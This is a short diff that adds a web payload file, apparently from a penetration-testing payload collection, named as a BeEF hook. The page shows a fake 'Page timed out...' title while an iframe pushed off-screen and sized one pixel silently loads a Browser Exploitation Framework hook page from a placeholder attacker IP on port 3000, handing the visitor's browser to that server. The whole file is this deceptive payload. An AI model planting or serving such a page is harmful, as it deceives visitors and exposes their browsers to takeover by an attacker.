+++ payloads/beef-hooks/beef_iFrame
@@ -1,0 +1,12 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="content-type" content="application/xhtml+xml; charset=iso-8859-1" />
+    <title>Page timed out...</title>
+  </head>
+  <body>
+    <div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">
+      <iframe width="1" scrolling="no" height="1" frameborder="0" src="http://<IP-ADDRESS>:3000/demos/butcher/index.html">
+    </div>
+  </body>
+</html>
